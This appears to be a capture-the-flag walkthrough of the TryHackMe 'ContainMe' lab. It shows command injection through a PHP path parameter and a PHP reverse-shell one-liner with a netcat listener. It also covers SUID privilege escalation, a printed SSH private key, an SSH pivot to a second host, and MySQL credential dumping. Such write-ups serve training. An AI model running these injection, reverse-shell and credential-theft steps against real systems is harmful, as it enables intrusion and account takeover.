# <div align="center">[ContainMe](https://tryhackme.com/room/containme1)</div>
<div align="center"></div>
<div align="center"></div>

## Intial Access
Let start with scanning and find running service
```
$ nmap -sV 10.49.172.109

PORT     STATE SERVICE       VERSION
22/tcp   open  tcpwrapped
80/tcp   open  tcpwrapped
2222/tcp open  EtherNetIP-1?
8022/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.13ppa1+obfuscated~focal (Ubuntu Linux; protocol 2.0)
```
There are 4 ports running
* tcpwrapped
* http is running on port 80
* ethernet-ip is running 2222
* ssh is running on port 8022

## Web Enemuration
as Port 80 is open let take a look at it 

<img width="804" height="592" alt="image" src="https://github.com/user-attachments/assets/8b820332-a480-4ed5-adfe-35ec965281be" />
Directory Enumeration

Its default appache page running on port at let do directory search and find out more 
```
~$ gobuster dir -w SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.49.172.109 -x md,js,html,php,py,css,txt,bak 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.172.109
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js,html,php,py,css,txt,bak,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10918]
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 329]
/info.php             (Status: 200) [Size: 68943]
```

The index.html just returned the default page. The index.php returned:-

Looked like it gave the content of the web-root directory. The info.php page gave information about php:-

<img width="964" height="919" alt="image" src="https://github.com/user-attachments/assets/3630d47c-2967-4fcc-b229-7ea0fea5a3ee" />

The main interest here was the index.php page. The source code of the page gave an interesting comment:-

```
$ curl http://10.49.172.109//index.php
<html>
<body>
	<pre>
	total 28K
drwxr-xr-x 2 root root 4.0K Jul 16  2021 .
drwxr-xr-x 3 root root 4.0K Jul 15  2021 ..
-rw-r--r-- 1 root root  11K Jul 15  2021 index.html
-rw-r--r-- 1 root root  154 Jul 16  2021 index.php
-rw-r--r-- 1 root root   20 Jul 15  2021 info.php
	<pre>

<!--  where is the path ?  -->

</body>
</html>
```
We can see this file are owned my root user 
## Exploitation
It gave us a hint where is the path that mean we can attempts  local file inclusion

```
death@esther:~$ curl http://10.49.172.109/index.php?path=/
<html>
<body>
	<pre>
	total 80K
drwxr-xr-x  22 root   root    4.0K Jul 15  2021 .
drwxr-xr-x  22 root   root    4.0K Jul 15  2021 ..
drwxr-xr-x   2 root   root    4.0K May 23 11:39 bin
drwxr-xr-x   2 root   root    4.0K Jun 29  2021 boot
drwxr-xr-x   8 root   root     500 May 23 11:27 dev
drwxr-xr-x  81 root   root    4.0K May 23 11:40 etc
drwxr-xr-x   3 root   root    4.0K Jul 19  2021 home
drwxr-xr-x  16 root   root    4.0K Jun 29  2021 lib
drwxr-xr-x   2 root   root    4.0K Apr 27  2025 lib64
drwxr-xr-x   2 root   root    4.0K Jun 29  2021 media
drwxr-xr-x   2 root   root    4.0K Jun 29  2021 mnt
drwxr-xr-x   2 root   root    4.0K Jun 29  2021 opt
dr-xr-xr-x 208 nobody nogroup    0 May 23 11:27 proc
drwx------   6 root   root    4.0K Jul 19  2021 root
drwxr-xr-x  17 root   root     700 May 23 11:41 run
drwxr-xr-x   2 root   root     12K May 23 11:38 sbin
drwxr-xr-x   2 root   root    4.0K Jul 14  2021 snap
drwxr-xr-x   2 root   root    4.0K Jun 29  2021 srv
dr-xr-xr-x  13 nobody nogroup    0 May 23 11:27 sys
drwxrwxrwt   2 root   root    4.0K May 23 11:39 tmp
drwxr-xr-x  10 root   root    4.0K May 23 11:37 usr
drwxr-xr-x  14 root   root    4.0K Jul 15  2021 var
	<pre>

<!--  where is the path ?  -->

</body>
</html>

death@esther:~$ 
```
Cool we hit a jackpot

Let create a reverse shell

After few attempts i got the shell with this php `proc_open`
```
;php -r '$s=fsockopen("<IP>",<Port>);proc_open("sh",[$s,$s,$s],$p);'
```

set up listener and get a reverse shell:
```
nc -lvnp 1234
```
Let inject this rev shell 

<img width="1318" height="151" alt="image" src="https://github.com/user-attachments/assets/e21a1e77-120d-43b9-917c-5eaa65e0b459" />

We got the shell

<img width="486" height="90" alt="image" src="https://github.com/user-attachments/assets/905de5d4-51e5-4dd4-8a18-04f1ce0feffe" />

And spawn a more stable shell to make interacting with it easier.
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Escalation
Now that we have access to an account, let’s attempt to escalate our privileges from the “mike” account to root.

```
www-data@host1:/var/www/html$ cd /home/mike
cd /home/mike
www-data@host1:/home/mike$ ls
ls
1cryptupx
www-data@host1:/home/mike$ file 1cryptupx
file 1cryptupx
bash: file: command not found
www-data@host1:/home/mike$ string 1cryptupx
string 1cryptupx
bash: string: command not found
www-data@host1:/home/mike$ ./1cryptupx
./1cryptupx
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

www-data@host1:/home/mike$ 
```
What the hell i though this would have some details

i just randomaly try bez its medium levl lab to check suid perm file 
```
find / -user root -perm /4000 2>/dev/null
```
and i got one 
```
www-data@host1:/home/mike$ find / -user root -perm /4000 2>/dev/null
find / -user root -perm /4000 2>/dev/null
/usr/share/man/zh_TW/crypt
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/mount
/bin/ping
/bin/su
/bin/umount
/bin/fusermount
/bin/ping6
www-data@host1:/home/mike$ 
```
This file is little wierd `/usr/share/man/zh_TW/crypt`
Checking one of the files looks like it’s owned by root and we can execute it.

```
www-data@host1:/home/mike$ ls -la /usr/share/man/zh_TW/crypt
ls -la /usr/share/man/zh_TW/crypt
-rwsr-xr-x 1 root root 358668 Jul 30  2021 /usr/share/man/zh_TW/crypt
www-data@host1:/home/mike$ 
```
since i got nothing, why not running the script with -h or — help and see what it can tell me before moving it into my machine but here is where it comes interesting
```
death@esther:~$ nc -lnvp 1234
Listening on 0.0.0.0 1234
Connection received on 10.49.172.109 35590
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@host1:/var/www/html$ file /usr/share/man/zh_TW/crypt
file /usr/share/man/zh_TW/crypt
bash: file: command not found
www-data@host1:/var/www/html$ /usr/share/man/zh_TW/crypt -h  
/usr/share/man/zh_TW/crypt -h
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝


You wish!
www-data@host1:/var/www/html$ /usr/share/man/zh_TW/crypt -a
/usr/share/man/zh_TW/crypt -a
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

Unable to decompress.
www-data@host1:/var/www/html$ /usr/share/man/zh_TW/crypt mike
/usr/share/man/zh_TW/crypt mike
░█████╗░██████╗░██╗░░░██╗██████╗░████████╗░██████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
██╔══██╗██╔══██╗╚██╗░██╔╝██╔══██╗╚══██╔══╝██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
██║░░╚═╝██████╔╝░╚████╔╝░██████╔╝░░░██║░░░╚█████╗░███████║█████╗░░██║░░░░░██║░░░░░
██║░░██╗██╔══██╗░░╚██╔╝░░██╔═══╝░░░░██║░░░░╚═══██╗██╔══██║██╔══╝░░██║░░░░░██║░░░░░
╚█████╔╝██║░░██║░░░██║░░░██║░░░░░░░░██║░░░██████╔╝██║░░██║███████╗███████╗███████╗
░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝

root@host1:/var/www/html# whoami
whoami
root
root@host1:/var/www/html# cd /root
cd /root
root@host1:/root# ls
ls
```
After passing some argument i goot root by typing
```
/usr/share/man/zh_TW/crypt mike
```
But twist is there is no root now the main issue is where is the flag
For a sec i There’s no flag. This is where the room’s name, “ContainMe,” really clicks. We’re root, but we’re root inside a container. Let’s check the network interfaces.
When i check id it clearfy everthing
```
root@host1:/home/mike# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
root@host1:/home/mike# 
```

We have two network interfaces. This confirms we’re on an internal network. The other host we need to get to is likely on that 172.16.20.0/24 network. Let’s grab Mike’s SSH private key from /home/mike/.ssh/id_rsa and use it to pivot.
```
root@host1:/root# ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.250.10  netmask 255.255.255.0  broadcast 192.168.250.255
        inet6 fe80::216:3eff:fe9c:ff0f  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:9c:ff:0f  txqueuelen 1000  (Ethernet)
        RX packets 332  bytes 25980 (25.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 491  bytes 417844 (417.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.20.2  netmask 255.255.255.0  broadcast 172.16.20.255
        inet6 fe80::216:3eff:fe46:6b29  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:46:6b:29  txqueuelen 1000  (Ethernet)
        RX packets 34  bytes 2692 (2.6 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 30  bytes 2276 (2.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 438499  bytes 103078341 (103.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 438499  bytes 103078341 (103.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@host1:/root# 
```
Crazy let get ssh key
```
root@host1:/root# cd /home/mike
cd /home/mike
root@host1:/home/mike# ls .ssh
ls .ssh
id_rsa  id_rsa.pub
root@host1:/home/mike# cat .ssh/id_rsa
cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAnWmOnLHQfBxrW0W0YuCiTuuGjCMUrISE4hdDMMuZruW6nj+z
YQCmjcL3T4j7v3/ddOBsTgxwi/+ZRZtRqJlvKEevPHJ8cR1DX7mmNyU3w/DRMnrW
djcIozYXVYdmj9v3e8xPbR6ybJX6fKpTuaDVdiwqQAecbvs5tBUkonAYUBuv1nhb
p/6+ZRYWNWv9RXE1XRuhROXD1Kl/tm7z4EcGZEDHu36oka23JJL7vzMeNtAdz3JF
wlGAtXH1cpdNa3+JKl/dBrRjV+YT3YivlqA2z4tRx/sA91RTxEO5oTYEL0bR1cKg
UPf1b21ecna8mpvQnkQmqQe8W9tSSlzVb6jnowIDAQABAoIBAA09O4liSy6lFUJv
8mP+kKgilwZiTPLVkneRjU0lUp+rIq78nJGkBF4X78T4uHO6xV13IqTN1wlvTezU
y2FqxjaVEN/8oQrCc1AxxREOSEpqjq24NyFqL4fKnNvMr4uZ7I60+FktI8SOOKsT
iEcsh8eQn10TRszuxEOpI5Ol6eWSzMPKxuw4ChniJsvaz8IDkYd4O/MDddjgcttb
Wv+LhX7qANPnRzeIDUNG2wmy3U+gxIJno/h3Xec0kVNQ0qwZmr56DO9G1oBbTU+4
6ynpIG2hEbSwGktWmnfw/4O+DZr8NiqeLY10G0MIwFIycuj2QfIF+mY6nqCZPWrH
8Lkf8wECgYEA0PMS/uqxL5u4e+bwSPdtfhEvFxk33/+PWMFIx0c5v7/jwtSW+/0v
YEIDC/DmHh9h4aF8dHMg8x18B50dw0HuLHWIgezNjJ9M8jwQgixRGamc5m6oFWh5
59581KWVIuDFqLG/6DN6cW/QQDo2MrNKP3QADeUPb2jhflzmir0TDLECgYEAwNud
VzZ6ON5YvbJbNh/JltSS1jAqUftzheX/m+3VrjE0iChLGvyP84aY7qpbiXNLHe+3
1/4JPoTljlml2RMTdZjAiF52u6KXwOLx6alGFoSbmAoZYG/4/Z0pwLjcozWGrjYD
03EDPdCclzWFyCqD9pYFGVAvEJuqx3rGYm1x/pMCgYEA0IdWFNwqOsYhBl6CvX9Z
YbBKm7XKQp2s9LnpJSAbLReXebBqgk+6gUk/+yHOto9BQ0nDiAACCT8KshqGQoDA
7tPZiTjIJqgwxatWGmOaCI9yi7IxwzPCPbqYQCyEOwuxl9rVGCqP7zfU0NSHlG/E
ELF3AGby0ZANQuv6FMn/gfECgYEAkjoyK31P4KyeBn8kb35coDNffm2YuP56Ei1Y
yMblPKVsWkyK3dRf5VrJvDSJIUe8zd8Duw6PvcqQL4XDnTq8h26hlQRi7FQU0hiB
KhTB4rL7MqV9pkRgOxOeI9VG3azpCFBGSFypA4aYJIJdhG7QDfijtxS4CtStAYES
yHCJfWcCgYAFzAx6hwi9smlvCpoZ1D8TRyqlxKf4YtSkTl74ZyiRESfvpuZSiclg
mFdVoHOt+gkpsXkmGmuqymIBRYGEw3dJ2C4MRPjx0UFpua0BAZ5k0ly6eaZuejWj
0/AHOf/jOfwvM4G2X0L8yjJqq/5F6NOjf9uxEusphzDcr/I1inuY3A==
-----END RSA PRIVATE KEY-----
root@host1:/home/mike# 
```
Now, from inside our container (host1), let’s try to SSH into the other host (host2). The other host’s IP is likely on the same subnet. Let’s try to guess or scan for it. A common convention is to use .1 for the gateway and other low numbers for hosts. After some quick scanning (or guessing), we can find the other host at 172.16.20.6.
```
ssh mike@172.16.20.6 -i id_rsa
```
we r into host2 machine
```
root@host1:/home/mike/.ssh# ssh mike@172.16.20.6 -i id_rsa
ssh mike@172.16.20.6 -i id_rsa
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 5.15.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

1 update can be applied immediately.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat May 23 17:22:48 2026 from 172.16.20.2
mike@host2:~$ id 
id 
uid=1001(mike) gid=1001(mike) groups=1001(mike)
mike@host2:~$ 
```

after taking a small brake since my brain is now smoking, i tried to check for services running and ports and i found mysql port 3306 open internally

```
ss -tulnp
```
```
mike@host2:~$ ss -tulnp
ss -tulnpss -tulnp
Total: 104 (kernel 0)
TCP:   33 (estab 2, closed 27, orphaned 0, synrecv 0, timewait 0/0), ports 0

Transport Total     IP        IPv6
*	  0         -         -        
RAW	  1         0         1        
UDP	  1         1         0        
TCP	  6         5         1        
INET	  8         6         2        
FRAG	  0         0         0        

Netid  State    Recv-Q   Send-Q      Local Address:Port     Peer Address:Port   
udp    UNCONN   0        0           127.0.0.53%lo:53            0.0.0.0:*      
tcp    LISTEN   0        128               0.0.0.0:22            0.0.0.0:*      
tcp    LISTEN   0        128         127.0.0.53%lo:53            0.0.0.0:*      
tcp    LISTEN   0        80              127.0.0.1:3306          0.0.0.0:*      
tcp    LISTEN   0        128                  [::]:22               [::]:*      
mike@host2:~$ 
```
OK now there is 3306 as we know this port represent mysql service
I tried to login in to MySQL using mike as username and tried some random passwords since i don’t have one and the one worked was : password
```
mike@host2:~$ mysql -u mike -p
mysql -u mike -p
Enter password: password
```
Press enter or click to view image in full size
```
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| accounts           |
+--------------------+
2 rows in set (0.00 sec)

mysql> use accounts;
use accounts;
Database changed
mysql> show tables;
show tables;
+--------------------+
| Tables_in_accounts |
+--------------------+
| users              |
+--------------------+
1 row in set (0.00 sec)

mysql> select * from users;
select * from users;
+-------+---------------------+
| login | password            |
+-------+---------------------+
| root  | bjsig4868fgjjeog    |
| mike  | ca |
+-------+---------------------+
2 rows in set (0.00 sec)

mysql>
```
bang !! we got pass 
```
mike@host2:~$ su root
su root
Password: bjsig4868fgjjeog

root@host2:/home/mike# cd /root
cd /root
root@host2:~# ls
ls
mike.zip
root@host2:~#
```
What we still not get flag there is an mike.zip 
```
root@host2:~# unzip mike.zip
unzip mike.zip
Archive:  mike.zip
[mike.zip] mike password: WhatAreYouDoingHere

 extracting: mike                    
root@host2:~# ls
ls
mike  mike.zip
```
It ask for mike password and i tried the password we get from database

## Root flag
```
root@host2:~# cat mike	
cat mike
THM{_Y0U_F0UND_TH3_C0NTA1N3RS_}
```

Crazy lab thanks for till here guys if u like this i really appricate it 
<img width="857" height="399" alt="image" src="https://github.com/user-attachments/assets/5c00631f-7413-4a4c-81f0-b4158c4c0ce7" />
